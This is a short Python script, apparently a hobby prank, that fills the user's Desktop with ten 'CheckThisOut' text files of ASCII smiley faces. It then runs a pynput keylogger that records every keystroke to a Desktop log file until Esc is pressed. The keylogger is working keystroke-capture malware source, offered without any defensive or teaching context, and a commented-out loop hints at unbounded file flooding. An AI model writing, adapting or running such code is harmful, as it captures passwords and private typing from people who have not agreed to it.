import os #For writing the files onto the desktop
import random #For choosing between 3 smiley faces
import keyboard #For keylogging
import pynput #For keylogging

from pynput import keyboard #Have to do it like this for listener

def keyboardCollector():
  class keyboardLog: #Make a keylogger and put it in a log
    def on_press(key):
        keys = [] #Empty array
        keys.append(key) #After after key press, add the key to the array

        filePath = os.path.join(os.path.expanduser("~/Desktop"), "keylogMoment.txt")

        with open(filePath, "a") as f: #Create and append to the file the keys pressed
            for i in keys:
                f.write(str(key).replace("'", "").replace("Key.space", " ").replace("Key.ctrl_l", "[lctrl]")
                        .replace("Key.ctrl_r", "[rctrl]").replace("Key.shift", "[shift]").replace("Key.alt_l", "[lalt]")
                        .replace("Key.alt_r", "[ralt]").replace("Key.enter", "\n").replace("Key.esc", "[esc]")
                        .replace("Key.backspace", "[del]"))

    def on_release(key):
        if str(key) == 'Key.esc':
            return False

    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener: #Listener for the keylogging
        listener.join()



def smileTime(desktop): #Create files on the desktop that all have a smiley face in them.
    #i = 0
    #while True:
    for i in range(10):
        smile = random.choice(['''
  , ; ,   .-'"""'-.   , ; ,
  \\|/  .'         '.  \|//
   \-;-/   ()   ()   \-;-/
   // ;               ; \\
  //__; :.         .; ;__\\
 `-----\'.'-.....-'.'/-----'
        '.'.-.-,_.'.'
          '(  (..-'"
    ''',
'''  .   -""""""-.
   .'          '.
  /   O    -=-   \
 :                :
 |                |
 : ',          ,' :
  \  '-......-'  /
   '.          .'
     '-......-''',
'''     .-""""""-.
   .'          '.
  /   O      O   \
 :                :
 |                |
 : ',          ,' :
  \  '-......-'  /
   '.          .'
     '-......-''''']) #Make a choice between 3 smiley faces to put into the text files
        
        fileName = f"CheckThisOut{i+1}.txt" #Changes the file name in every iteration
        filePath = os.path.join(desktop, fileName) #Join the paths of the desktop path with the filename so as to create a new file every time.

        with open(filePath, "w") as file: #Using the with to replace the try/catch statement, but opens and writes to the new filePath.
            file.write(smile) #Writes the smile into the textfile.
        #i = i + 1

desktop = os.path.expanduser("~/Desktop") #Expands the path to the before part of the ~.

smileTime(desktop)

keyboardCollector()